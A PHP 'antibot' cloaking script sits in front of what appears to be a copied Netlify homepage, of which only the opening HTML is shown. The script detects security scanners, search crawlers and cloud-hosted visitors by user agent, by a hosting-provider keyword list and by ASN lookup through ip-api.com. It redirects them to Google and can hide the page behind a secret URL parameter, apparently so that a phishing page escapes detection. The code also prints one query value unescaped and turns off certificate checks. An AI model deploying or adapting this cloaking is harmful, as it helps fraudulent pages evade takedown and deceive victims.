<?php
/**
 * Antibot Protection Script with cURL
 * Blocks bots, crawlers, and suspicious IP addresses
 * Usage: require_once 'antibot.php'; at the top of your main page
 */

class AntibotProtection {
    
    private $blockedKeywords = [
        'facebook',
        'meta',
        'google',
        'amazon',
        'microsoft',
        'digitalocean',
        'vultr',
        'linode',
        'ovh',
        'hetzner',
        'cloudflare'
    ];
    
    private $botPatterns = [
        'Googlebot', 'Googlebot-Mobile', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
        'AdsBot-Google', 'Feedfetcher-Google', 'Mediapartners-Google', 'APIs-Google',
        'Google-InspectionTool', 'Storebot-Google', 'GoogleOther', 'bingbot', 'Slurp',
        'wget', 'LinkedInBot', 'Python-urllib', 'python-requests', 'aiohttp', 'httpx',
        'libwww-perl', 'httpunit', 'Nutch', 'Go-http-client', 'phpcrawl', 'msnbot',
        'jyxobot', 'FAST-WebCrawler', 'BIGLOTRON', 'Teoma', 'convera', 'seekbot',
        'Gigabot', 'Gigablast', 'exabot', 'ia_archiver', 'GingerCrawler', 'webmon',
        'HTTrack', 'grub.org', 'UsineNouvelleCrawler', 'antibot', 'netresearchserver',
        'speedy', 'fluffy', 'findlink', 'msrbot', 'panscient', 'yacybot', 'AISearchBot',
        'ips-agent', 'tagoobot', 'MJ12bot', 'woriobot', 'yanga', 'buzzbot', 'mlbot',
        'yandex.com/bots', 'purebot', 'Linguee Bot', 'CyberPatrol', 'voilabot',
        'Baiduspider', 'citeseerxbot', 'spbot', 'twengabot', 'postrank', 'Turnitin',
        'scribdbot', 'page2rss', 'sitebot', 'linkdex', 'Adidxbot', 'ezooms', 'dotbot',
        'Mail.RU_Bot', 'discobot', 'heritrix', 'findthatfile', 'europarchive.org',
        'NerdByNature.Bot', 'sistrix', 'SISTRIX', 'AhrefsBot', 'AhrefsSiteAudit',
        'fuelbot', 'CrunchBot', 'IndeedBot', 'mappydata', 'woobot', 'ZoominfoBot',
        'PrivacyAwareBot', 'Multiviewbot', 'SWIMGBot', 'Grobbot', 'eright', 'Apercite',
        'semanticbot', 'Aboundex', 'domaincrawler', 'wbsearchbot', 'summify', 'CCBot',
        'edisterbot', 'SeznamBot', 'ec2linkfinder', 'gslfbot', 'aiHitBot', 'intelium_bot',
        'facebookexternalhit', 'Yeti', 'RetrevoPageAnalyzer', 'lb-spider', 'Sogou',
        'lssbot', 'careerbot', 'wotbox', 'wocbot', 'ichiro', 'DuckDuckBot',
        'lssrocketcrawler', 'drupact', 'webcompanycrawler', 'acoonbot', 'openindexspider',
        'gnam gnam spider', 'web-archive-net.com.bot', 'backlinkcrawler', 'coccoc',
        'integromedb', 'content crawler spider', 'toplistbot', 'it2media-domain-crawler',
        'ip-web-crawler.com', 'siteexplorer.info', 'elisabot', 'proximic',
        'changedetection', 'arabot', 'WeSEE:Search', 'niki-bot', 'CrystalSemanticsBot',
        'rogerbot', '360Spider', 'psbot', 'InterfaxScanBot', 'CC Metadata Scaper',
        'g00g1e.net', 'GrapeshotCrawler', 'urlappendbot', 'brainobot', 'fr-crawler',
        'binlar', 'SimpleCrawler', 'Twitterbot', 'cXensebot', 'smtbot', 'bnf.fr_bot',
        'A6-Indexer', 'ADmantX', 'Facebot', 'OrangeBot', 'memorybot', 'AdvBot',
        'MegaIndex', 'SemanticScholarBot', 'ltx71', 'nerdybot', 'xovibot', 'BUbiNG',
        'Qwantify', 'archive.org_bot', 'Applebot', 'TweetmemeBot', 'crawler4j',
        'findxbot', 'SemrushBot', 'SEMrushBot', 'yoozBot', 'lipperhey', 'Y!J',
        'Domain Re-Animator Bot', 'AddThis', 'Screaming Frog SEO Spider', 'MetaURI',
        'Scrapy', 'Livelapbot', 'LivelapBot', 'OpenHoseBot', 'CapsuleChecker',
        'collection@infegy.com', 'IstellaBot', 'DeuSu', 'betaBot', 'Cliqzbot',
        'MojeekBot', 'netEstate NE Crawler', 'SafeSearch microdata crawler',
        'Gluten Free Crawler', 'Sonic', 'Sysomos', 'Trove', 'deadlinkchecker',
        'Slack-ImgProxy', 'Embedly', 'RankActiveLinkBot', 'iskanie', 'SafeDNSBot',
        'SkypeUriPreview', 'Veoozbot', 'Slackbot', 'redditbot', 'datagnionbot',
        'Google-Adwords-Instant', 'adbeat_bot', 'WhatsApp', 'contxbot', 'pinterest.com/bot',
        'electricmonk', 'GarlikCrawler', 'BingPreview', 'vebidoobot', 'FemtosearchBot',
        'Yahoo Link Preview', 'MetaJobBot', 'DomainStatsBot', 'mindUpBot', 'Daum',
        'Jugendschutzprogramm-Crawler', 'Xenu Link Sleuth', 'Pcore-HTTP', 'moatbot',
        'KosmioBot', 'Pingdom', 'pingdom', 'AppInsights', 'PhantomJS', 'Gowikibot',
        'PiplBot', 'Discordbot', 'TelegramBot', 'Jetslide', 'newsharecounts',
        'James BOT', 'Barkrowler', 'BarkRowler', 'TinEye', 'SocialRankIOBot',
        'trendictionbot', 'Ocarinabot', 'epicbot', 'Primalbot', 'DuckDuckGo-Favicons-Bot',
        'GnowitNewsbot', 'Leikibot', 'LinkArchiver', 'YaK', 'PaperLiBot', 'Digg Deeper',
        'dcrawl', 'Snacktory', 'AndersPinkBot', 'Fyrebot', 'EveryoneSocialBot',
        'Mediatoolkitbot', 'Luminator-robots', 'ExtLinksBot', 'SurveyBot', 'NING',
        'okhttp', 'Nuzzel', 'omgili', 'PocketParser', 'YisouSpider', 'um-LN',
        'ToutiaoSpider', 'MuckRack', 'Jamie\'s Spider', 'AHC', 'NetcraftSurveyAgent',
        'Laserlikebot', 'Apache-HttpClient', 'AppEngine-Google', 'Jetty', 'Upflow',
        'Thinklab', 'Traackr.com', 'Twurly', 'Mastodon', 'http_get', 'DnyzBot',
        'botify', '007ac9 Crawler', 'BehloolBot', 'BrandVerity', 'check_http',
        'BDCbot', 'ZumBot', 'EZID', 'ICC-Crawler', 'ArchiveBot', 'LCC',
        'filterdb.iss.net/crawler', 'BLP_bbot', 'BomboraBot', 'Buck', 'Companybook-Crawler',
        'Genieo', 'magpie-crawler', 'MeltwaterNews', 'Moreover', 'newspaper', 'ScoutJet',
        'sentry', 'StorygizeBot', 'UptimeRobot', 'OutclicksBot', 'seoscanners',
        'python-requests', 'Hatena', 'Google Web Preview', 'MauiBot', 'AlphaBot',
        'SBL-BOT', 'IAS crawler', 'adscanner', 'Netvibes', 'acapbot', 'Baidu-YunGuanCe',
        'bitlybot', 'blogmuraBot', 'Bot.AraTurka.com', 'bot-pge.chlooe.com', 'BoxcarBot',
        'BTWebClient', 'ContextAd Bot', 'Digincore bot', 'Disqus', 'Feedly', 'Fetch',
        'Fever', 'Flamingo_SearchEngine', 'FlipboardProxy', 'g2reader-bot',
        'G2 Web Services', 'imrbot', 'K7MLWCBot', 'Kemvibot', 'Landau-Media-Spider',
        'linkapediabot', 'vkShare', 'Siteimprove.com', 'BLEXBot', 'DareBoost',
        'ZuperlistBot', 'Miniflux', 'Feedspot', 'Diffbot', 'SEOkicks', 'tracemyfile',
        'Nimbostratus-Bot', 'zgrab', 'PR-CY.RU', 'AdsTxtCrawler', 'Datafeedwatch',
        'Zabbix', 'TangibleeBot', 'google-xrawler', 'axios', 'Amazon CloudFront',
        'Pulsepoint', 'CloudFlare', 'Cloudflare', 'Google-Structured-Data-Testing-Tool',
        'WordupInfoSearch', 'WebDataStats', 'HttpUrlConnection', 'ZoomBot',
        'VelenPublicWebCrawler', 'MoodleBot', 'jpg-newsbot', 'outbrain', 'W3C_Validator',
        'Validator.nu', 'W3C-checklink', 'W3C-mobileOK', 'W3C_I18n-Checker',
        'FeedValidator', 'W3C_CSS_Validator', 'W3C_Unicorn', 'Google-PhysicalWeb',
        'Blackboard', 'ICBot', 'BazQux', 'Twingly', 'Rivva', 'Experibot',
        'awesomecrawler', 'Dataprovider.com', 'GroupHigh', 'theoldreader.com',
        'AnyEvent', 'Uptimebot.org', 'Nmap Scripting Engine', '2ip.ru', 'Clickagy',
        'Caliperbot', 'MBCrawler', 'online-webceo-bot', 'B2B Bot', 'AddSearchBot',
        'Google Favicon', 'HubSpot', 'Chrome-Lighthouse', 'HeadlessChrome',
        'CheckMarkNetwork', 'www.uptime.com', 'Streamline3Bot', 'serpstatbot',
        'MixnodeCache', 'curl', 'SimpleScraper', 'RSSingBot', 'Jooblebot',
        'fedoraplanet', 'Friendica', 'NextCloud', 'Tiny Tiny RSS', 'RegionStuttgartBot',
        'Bytespider', 'Datanyze', 'Google-Site-Verification', 'TrendsmapResolver',
        'tweetedtimes', 'NTENTbot', 'Gwene', 'SimplePie', 'SearchAtlas', 'Superfeedr',
        'feedbot', 'UT-Dorkbot', 'Amazonbot', 'SerendeputyBot', 'Eyeotabot',
        'officestorebot', 'Neticle Crawler', 'SurdotlyBot', 'LinkisBot',
        'AwarioSmartBot', 'AwarioRssBot', 'RyteBot', 'FreeWebMonitoring SiteChecker',
        'AspiegelBot', 'NAVER Blog Rssbot', 'zenback bot', 'SentiBot',
        'Domains Project', 'Pandalytics', 'VKRobot', 'bidswitchbot', 'tigerbot',
        'NIXStatsbot', 'Atom Feed Robot', 'Curebot', 'curebot', 'PagePeeker',
        'Vigil', 'rssbot', 'startmebot', 'JobboerseBot', 'seewithkids', 'NINJA bot',
        'Cutbot', 'BublupBot', 'BrandONbot', 'RidderBot', 'Taboolabot', 'Dubbotbot',
        'FindITAnswersbot', 'infoobot', 'Refindbot', 'BlogTraffic', 'SeobilityBot',
        'Cincraw', 'Dragonbot', 'VoluumDSP-content-bot', 'FreshRSS', 'BitBot',
        'PHP-Curl-Class', 'Google-Certificates-Bridge', 'centurybot', 'Viber',
        'e.ventures Investment Crawler', 'evc-batch', 'PetalBot', 'virustotal',
        'PTST', 'minicrawler', 'Cookiebot', 'trovitBot', 'seostar.co', 'IonCrawl',
        'Uptime-Kuma', 'Seekport', 'FreshpingBot', 'Feedbin', 'CriteoBot',
        'Snap URL Preview Service', 'Better Uptime Bot', 'RuxitSynthetic',
        'Google-Read-Aloud', 'Valve/Steam', 'OdklBot', 'GPTBot', 'ChatGPT-User',
        'OAI-SearchBot', 'YandexRenderResourcesBot', 'LightspeedSystemsCrawler',
        'ev-crawler', 'BitSightBot', 'woorankreview', 'Google-Safety', 'AwarioBot',
        'DataForSeoBot', 'Linespider', 'WellKnownBot', 'A Patent Crawler', 'StractBot',
        'search.marginalia.nu', 'YouBot', 'Nicecrawler', 'Neevabot', 'BrightEdge Crawler',
        'SiteCheckerBotCrawler', 'TombaPublicWebCrawler', 'CrawlyProjectCrawler',
        'KomodiaBot', 'KStandBot', 'CISPA Webcrawler', 'MTRobot', 'hyscore.io',
        'AlexandriaOrgBot', '2ip bot', 'Yellowbrandprotectionbot', 'SEOlizer',
        'vuhuvBot', 'INETDEX-BOT', 'Synapse', 't3versionsBot', 'deepnoc',
        'Cocolyzebot', 'hypestat', 'ReverseEngineeringBot', 'sempi.tech', 'Iframely',
        'MetaInspector', 'node-fetch', 'l9explore', 'python-opengraph', 'OpenGraphCheck',
        'developers.google.com/+/web/snippet', 'SenutoBot', 'MaCoCu', 'NewsBlur',
        'inoreader', 'NetSystemsResearch', 'PageThing', 'WordPress', 'PhxBot',
        'ImagesiftBot', 'Expanse', 'InternetMeasurement', 'BW', 'GeedoBot',
        'Audisto Crawler', 'PerplexityBot', 'ClaudeBot', 'claudebot', 'Monsidobot',
        'GroupMeBot', 'Vercelbot', 'vercel-screenshot', 'facebookcatalog',
        'meta-externalagent', 'meta-externalfetcher', 'AcademicBotRTU', 'KeybaseBot',
        'Lemmy', 'CookieHubScan', 'Hydrozen.io', 'HTTP Banner Detection', 'SummalyBot',
        'MicrosoftPreview', 'GeedoProductSearch', 'TikTokSpider', 'OnCrawl',
        'sindresorhus/got', 'CensysInspect', 'SBIntuitionsBot', 'sitebulb'
    ];
    
    private $debugMode = false;
    private $blockReason = '';
    private $parameterMode = true; // Set to true to enable parameter protection
    private $requiredParameter = 'tokens'; // URL parameter name that must exist
    
    public function __construct($debug = false, $enableParameterMode = false, $parameterName = 'tokens') {
        $this->debugMode = $debug;
        
        // Configure parameter protection if enabled
        if ($enableParameterMode) {
            $this->parameterMode = true;
            $this->requiredParameter = $parameterName;
            $this->debugLog("Parameter protection ENABLED - Required parameter: '?" . $parameterName . "'");
        } else {
            $this->debugLog("Parameter protection DISABLED - Normal detection mode");
        }
        
        $this->checkAccess();
    }
    
    public function getUserIP() {
        $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
                   'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 
                   'REMOTE_ADDR'];
        
        foreach ($ip_keys as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, 
                        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        return $ip;
                    }
                }
            }
        }
        
        return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    }
    
    private function checkParameter() {
        if (!$this->parameterMode) {
            $this->debugLog("Parameter mode disabled - skipping parameter check");
            return true; // Parameter mode not enabled, allow normal processing
        }
        
        $parameterExists = isset($_GET[$this->requiredParameter]);
        $this->debugLog("Parameter mode enabled - checking for parameter '?" . $this->requiredParameter . "'");
        $this->debugLog("Parameter exists: " . ($parameterExists ? 'YES' : 'NO'));
        
        if (!$parameterExists) {
            $this->blockReason = "PARAMETER_MISSING: Required parameter '?" . $this->requiredParameter . "' not found - likely bot access";
            $this->debugLog("Parameter check FAILED: Missing required parameter");
            return false;
        }
        
        $this->debugLog("Parameter check PASSED: Required parameter found");
        return true;
    }
    
    private function debugLog($message) {
        if ($this->debugMode) {
            $logFile = dirname(__FILE__) . '/antibot_debug.log';
            $timestamp = date('Y-m-d H:i:s');
            $logEntry = "[{$timestamp}] DEBUG: {$message}" . PHP_EOL;
            @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
        }
    }
    
    private function checkUserAgent() {
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $this->debugLog("Checking User Agent: " . $userAgent);
        
        // Check against bot patterns
        foreach ($this->botPatterns as $pattern) {
            if (stripos($userAgent, $pattern) !== false) {
                $this->blockReason = "USER_AGENT_BOT_PATTERN: '{$pattern}' found in '{$userAgent}'";
                $this->debugLog("Bot detected by pattern: " . $pattern);
                return true;
            }
        }
        
        // Check for empty or suspicious user agents
        if (empty($userAgent) || strlen($userAgent) < 10) {
            $this->blockReason = "USER_AGENT_SUSPICIOUS: Too short or empty (length: " . strlen($userAgent) . ")";
            $this->debugLog("Suspicious user agent: too short or empty");
            return true;
        }
        
        // Check for common bot signatures
        $suspiciousPatterns = [
            '/bot/i', '/crawler/i', '/spider/i', '/scraper/i', '/harvester/i',
            '/perl/i', '/python/i', '/java/i', '/curl/i', '/wget/i',
            '/libwww/i', '/apache/i', '/http/i'
        ];
        
        foreach ($suspiciousPatterns as $pattern) {
            if (preg_match($pattern, $userAgent)) {
                $this->blockReason = "USER_AGENT_REGEX_PATTERN: '{$pattern}' matched in '{$userAgent}'";
                $this->debugLog("Bot detected by regex pattern: " . $pattern);
                return true;
            }
        }
        
        $this->debugLog("User agent passed all checks");
        return false;
    }
    
    private function curlRequest($url, $timeout = 10) {
        $this->debugLog("Making cURL request to: " . $url);
        
        if (!function_exists('curl_init')) {
            $this->debugLog("cURL is not available - aborting IP check");
            return false;
        }
        
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityBot/1.0)',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => [
                'Accept: application/json',
                'Accept-Language: en-US,en;q=0.9',
                'Cache-Control: no-cache',
                'Connection: close'
            ],
            CURLOPT_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS,
            CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS,
            CURLOPT_FORBID_REUSE => true,
            CURLOPT_FRESH_CONNECT => true
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        $errorCode = curl_errno($ch);
        
        curl_close($ch);
        
        $this->debugLog("cURL Response - HTTP Code: {$httpCode}, Error Code: {$errorCode}, Error: {$error}");
        
        if ($response === false || $errorCode !== 0) {
            $this->debugLog("cURL request failed: {$error} (Code: {$errorCode})");
            return false;
        }
        
        if ($httpCode !== 200) {
            $this->debugLog("cURL request returned non-200 status: {$httpCode}");
            return false;
        }
        
        $this->debugLog("cURL request successful, response length: " . strlen($response));
        return $response;
    }
    
    private function checkIPAddress($ip) {
        $this->debugLog("Checking IP Address: " . $ip);
        
        if ($ip === '127.0.0.1' || $ip === 'localhost') {
            $this->debugLog("Skipping localhost IP check");
            return false;
        }
        
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            $this->debugLog("Invalid IP format");
            return false;
        }
        
        try {
            $url = "http://ip-api.com/json/{$ip}?fields=status,isp,org,as,country,query";
            $this->debugLog("Making fresh IP API call: " . $url);
            
            $response = $this->curlRequest($url, 10);
            
            if ($response === false) {
                $this->debugLog("IP API call failed - allowing access");
                return false;
            }
            
            $data = json_decode($response, true);
            $this->debugLog("IP API Response: " . json_encode($data));
            
            if (!$data || $data['status'] !== 'success') {
                $this->debugLog("IP API returned error status");
                return false;
            }
            
            $blockResult = $this->isBlockedProvider($data);
            $isBlocked = $blockResult['blocked'];
            $blockReason = $blockResult['reason'];
            
            if ($isBlocked) {
                $this->blockReason = $blockReason;
                $this->debugLog("IP Block Decision: BLOCKED - Reason: " . $blockReason);
            } else {
                $this->debugLog("IP Block Decision: ALLOWED");
            }
            
            return $isBlocked;
            
        } catch (Exception $e) {
            $this->debugLog("Exception during IP check: " . $e->getMessage());
            return false;
        }
    }
    
    private function isBlockedProvider($data) {
        $isp = trim($data['isp'] ?? '');
        $org = trim($data['org'] ?? '');
        $as = trim($data['as'] ?? '');
        
        $this->debugLog("Checking ISP: '" . $isp . "' (length: " . strlen($isp) . ")");
        $this->debugLog("Checking ORG: '" . $org . "' (length: " . strlen($org) . ")");
        $this->debugLog("Checking AS: '" . $as . "' (length: " . strlen($as) . ")");
        
        // Check ISP for sensitive keywords
        if (!empty($isp)) {
            foreach ($this->blockedKeywords as $index => $keyword) {
                $this->debugLog("Testing ISP keyword #{$index}: '" . $keyword . "' against '" . $isp . "'");
                if (stripos($isp, $keyword) !== false) {
                    $reason = "IP_ISP_BLOCKED: ISP '{$isp}' contains blocked keyword '{$keyword}'";
                    $this->debugLog("BLOCKED by ISP keyword: '" . $keyword . "' found in '" . $isp . "'");
                    return ['blocked' => true, 'reason' => $reason];
                }
            }
        }
        
        // Check Organization for sensitive keywords
        if (!empty($org)) {
            foreach ($this->blockedKeywords as $index => $keyword) {
                $this->debugLog("Testing ORG keyword #{$index}: '" . $keyword . "' against '" . $org . "'");
                if (stripos($org, $keyword) !== false) {
                    $reason = "IP_ORG_BLOCKED: Organization '{$org}' contains blocked keyword '{$keyword}'";
                    $this->debugLog("BLOCKED by ORG keyword: '" . $keyword . "' found in '" . $org . "'");
                    return ['blocked' => true, 'reason' => $reason];
                }
            }
        }
        
        // Check AS (Autonomous System) for sensitive keywords and specific AS numbers
        if (!empty($as)) {
            // Check for keyword matches in AS field
            foreach ($this->blockedKeywords as $index => $keyword) {
                $this->debugLog("Testing AS keyword #{$index}: '" . $keyword . "' against '" . $as . "'");
                if (stripos($as, $keyword) !== false) {
                    $reason = "IP_AS_BLOCKED: Autonomous System '{$as}' contains blocked keyword '{$keyword}'";
                    $this->debugLog("BLOCKED by AS keyword: '" . $keyword . "' found in '" . $as . "'");
                    return ['blocked' => true, 'reason' => $reason];
                }
            }
            
            // Check for specific blocked AS numbers
            $suspiciousAS = [
                'AS32934', // Facebook
                'AS13414', // Twitter
                'AS15169', // Google
                'AS16509', // Amazon
                'AS8075',  // Microsoft
                'AS13335', // Cloudflare
                'AS14061', // DigitalOcean
                'AS20473', // Vultr
                'AS63949', // Linode
                'AS16276', // OVH
                'AS24940'  // Hetzner
            ];
            
            foreach ($suspiciousAS as $index => $suspAS) {
                $this->debugLog("Testing AS number #{$index}: '" . $suspAS . "' against '" . $as . "'");
                if (stripos($as, $suspAS) !== false) {
                    $reason = "IP_AS_NUMBER_BLOCKED: Autonomous System '{$as}' contains blocked AS number '{$suspAS}'";
                    $this->debugLog("BLOCKED by AS number: '" . $suspAS . "' found in '" . $as . "'");
                    return ['blocked' => true, 'reason' => $reason];
                }
            }
        }
        
        $this->debugLog("No blocking rules matched - ALLOWED");
        return ['blocked' => false, 'reason' => 'IP_ALLOWED'];
    }
    
    private function blockAccess() {
        $this->debugLog("BLOCKING ACCESS - Reason: " . $this->blockReason);
        
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        header('HTTP/1.1 301 Moved Permanently');
        header('Location: https://www.google.com');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        
        $this->logBlockedAccess();
        
        exit;
    }
    
    private function logBlockedAccess() {
        $logFile = dirname(__FILE__) . '/antibot.log';
        $ip = $this->getUserIP();
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $timestamp = date('Y-m-d H:i:s');
        $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
        $reason = $this->blockReason ?: 'UNKNOWN_REASON';
        
        $logEntry = "[{$timestamp}] BLOCKED - IP: {$ip} | Reason: {$reason} | UA: {$userAgent} | Referer: {$referer}" . PHP_EOL;
        
        if (file_exists($logFile) && filesize($logFile) > 10485760) {
            rename($logFile, $logFile . '.' . date('Y-m-d-H-i-s'));
        }
        
        @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    public function checkAccess() {
        $this->debugLog("=== Starting Access Check ===");
        $this->debugLog("Remote IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
        
        // Skip all checks for localhost during development
        if (in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1', '::1'])) {
            $this->debugLog("Localhost detected - skipping all checks");
            return true;
        }
        
        // Check parameter first if parameter mode is enabled
        if (!$this->checkParameter()) {
            $this->debugLog("Access blocked due to parameter check - Reason: " . $this->blockReason);
            $this->blockAccess();
        }
        
        // If parameter check passed (or parameter mode disabled), proceed with normal detection
        $this->debugLog("Parameter check passed - proceeding with normal detection");
        
        if ($this->checkUserAgent()) {
            $this->debugLog("Access blocked due to User Agent check - Reason: " . $this->blockReason);
            $this->blockAccess();
        }
        
        $ip = $this->getUserIP();
        $this->debugLog("Detected IP for checking: " . $ip);
        
        if ($this->checkIPAddress($ip)) {
            $this->debugLog("Access blocked due to IP check - Reason: " . $this->blockReason);
            $this->blockAccess();
        }
        
        $this->debugLog("=== Access ALLOWED ===");
        return true;
    }
    
    public function testIP($testIP) {
        $this->debugLog("=== TESTING IP: " . $testIP . " ===");
        $result = $this->checkIPAddress($testIP);
        if ($result) {
            $this->debugLog("Test IP BLOCKED - Reason: " . $this->blockReason);
        } else {
            $this->debugLog("Test IP ALLOWED");
        }
        return $result;
    }
    
    public function testCurl($testUrl = 'http://httpbin.org/get') {
        $this->debugLog("=== TESTING cURL functionality ===");
        $response = $this->curlRequest($testUrl, 5);
        
        if ($response !== false) {
            $this->debugLog("cURL test successful");
            return json_decode($response, true);
        } else {
            $this->debugLog("cURL test failed");
            return false;
        }
    }
    
    public function getBlockReason() {
        return $this->blockReason;
    }
    
    public function enableParameterMode($parameterName = 'tokens') {
        $this->parameterMode = true;
        $this->requiredParameter = $parameterName;
        $this->debugLog("Parameter mode enabled via method call - Parameter: '?" . $parameterName . "'");
    }
    
    public function disableParameterMode() {
        $this->parameterMode = false;
        $this->debugLog("Parameter mode disabled via method call");
    }
    
    public function isParameterModeEnabled() {
        return $this->parameterMode;
    }
}

class RateLimiter {
    private $maxRequests = 60;
    private $timeWindow = 60;
    private $antibot;
    
    public function __construct() {
        $this->antibot = new AntibotProtection();
    }
    
    public function checkRateLimit() {
        if (in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1', '::1'])) {
            return true;
        }
        
        $ip = $this->antibot->getUserIP();
        $cacheFile = sys_get_temp_dir() . '/rate_limit_' . md5($ip);
        
        $requests = [];
        if (file_exists($cacheFile)) {
            $requests = json_decode(file_get_contents($cacheFile), true) ?: [];
        }
        
        $now = time();
        $requests = array_filter($requests, function($timestamp) use ($now) {
            return ($now - $timestamp) <= $this->timeWindow;
        });
        
        if (count($requests) >= $this->maxRequests) {
            header('HTTP/1.1 429 Too Many Requests');
            header('Retry-After: ' . $this->timeWindow);
            exit('Rate limit exceeded');
        }
        
        $requests[] = $now;
        file_put_contents($cacheFile, json_encode($requests));
        
        return true;
    }
}

// Configuration
$debug = isset($_GET['debug']) && $_GET['debug'] === '1';

// Parameter Mode Configuration
// Set $enableParameterMode to true to require parameter for access
// Set $parameterName to your desired URL parameter name
$enableParameterMode = false; // Change to true to enable parameter protection
$parameterName = 'tokens'; // URL parameter name (e.g., ?tokens)

// Initialize the antibot protection
if ($enableParameterMode) {
    $antibot = new AntibotProtection($debug, true, $parameterName);
    echo "<!-- Parameter Mode ENABLED: Access requires ?" . $parameterName . " -->" . PHP_EOL;
} else {
    $antibot = new AntibotProtection($debug, false);
    echo "<!-- Parameter Mode DISABLED: Normal detection mode -->" . PHP_EOL;
}

// Test parameter mode if requested
if (isset($_GET['test_param']) && $_GET['test_param'] === '1') {
    echo "<h3>Parameter Mode Status</h3>";
    echo "<p><strong>Parameter Mode:</strong> " . ($antibot->isParameterModeEnabled() ? 'ENABLED' : 'DISABLED') . "</p>";
    
    if ($antibot->isParameterModeEnabled()) {
        $parameterExists = isset($_GET[$parameterName]);
        echo "<p><strong>Required Parameter:</strong> ?" . $parameterName . "</p>";
        echo "<p><strong>Parameter Status:</strong> " . ($parameterExists ? 'PRESENT' : 'MISSING') . "</p>";
        
        if (!$parameterExists) {
            echo "<p style='color: red;'><strong>Result:</strong> ACCESS WOULD BE BLOCKED (missing parameter)</p>";
            echo "<p><strong>Try:</strong> <a href='?test_param=1&{$parameterName}'>Click here with required parameter</a></p>";
        } else {
            echo "<p style='color: green;'><strong>Result:</strong> PARAMETER FOUND - Normal detection would proceed</p>";
        }
    }
    
    // Show debug log if available
    $debugFile = dirname(__FILE__) . '/antibot_debug.log';
    if (file_exists($debugFile)) {
        echo "<h4>Debug Log (last 10 lines):</h4>";
        echo "<pre style='background: #f0f0f0; padding: 10px; max-height: 200px; overflow-y: scroll;'>";
        $lines = file($debugFile);
        $lastLines = array_slice($lines, -10);
        echo htmlspecialchars(implode('', $lastLines));
        echo "</pre>";
    }
    exit;
}
if (isset($_GET['test_ip']) && !empty($_GET['test_ip'])) {
    $testIP = $_GET['test_ip'];
    $result = $antibot->testIP($testIP);
    echo "<h3>Test Results for IP: {$testIP}</h3>";
    echo "<p>Result: <strong>" . ($result ? 'BLOCKED' : 'ALLOWED') . "</strong></p>";
    
    if ($result) {
        echo "<p>Block Reason: <strong>" . htmlspecialchars($antibot->getBlockReason()) . "</strong></p>";
    }
    
    // Show debug log if available
    $debugFile = dirname(__FILE__) . '/antibot_debug.log';
    if (file_exists($debugFile)) {
        echo "<h4>Debug Log (last 50 lines):</h4>";
        echo "<pre style='background: #f0f0f0; padding: 10px; max-height: 400px; overflow-y: scroll;'>";
        $lines = file($debugFile);
        $lastLines = array_slice($lines, -50);
        echo htmlspecialchars(implode('', $lastLines));
        echo "</pre>";
    }
    exit;
}

// Test cURL functionality if requested
if (isset($_GET['test_curl']) && $_GET['test_curl'] === '1') {
    echo "<h3>cURL Test Results</h3>";
    $result = $antibot->testCurl();
    
    if ($result !== false) {
        echo "<p><strong>Status:</strong> SUCCESS</p>";
        echo "<p><strong>Response:</strong></p>";
        echo "<pre style='background: #f0f0f0; padding: 10px; max-height: 300px; overflow-y: scroll;'>";
        echo htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT));
        echo "</pre>";
    } else {
        echo "<p><strong>Status:</strong> FAILED</p>";
        echo "<p>Check the debug log for more information.</p>";
    }
    
    // Show debug log if available
    $debugFile = dirname(__FILE__) . '/antibot_debug.log';
    if (file_exists($debugFile)) {
        echo "<h4>Debug Log (last 20 lines):</h4>";
        echo "<pre style='background: #f0f0f0; padding: 10px; max-height: 300px; overflow-y: scroll;'>";
        $lines = file($debugFile);
        $lastLines = array_slice($lines, -20);
        echo htmlspecialchars(implode('', $lastLines));
        echo "</pre>";
    }
    exit;
}

// Uncomment the line below to enable rate limiting
// (new RateLimiter())->checkRateLimit();

?>
<html lang="en" style="--site-header-height: 2237.466552734375px;"><head><style data-hubspot-styled-components=""></style>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <meta name="generator" content="Astro v5.13.3">
        <!-- Page information -->
        <title>Scale &amp;Ship Faster with a Composable Web Architecture | Netlify</title>
        <meta name="description" content="Realize the speed, agility and performance of a scalable, composable web architecture with Netlify. Explore the composable web platform now!">
        <link rel="canonical" href="https://www.netlify.com/">
        <!-- Favicons -->
        <link rel="icon" href="/favicon/favicon.ico" sizes="32x32">
        <link rel="icon" href="/favicon/icon.svg" type="image/svg+xml">
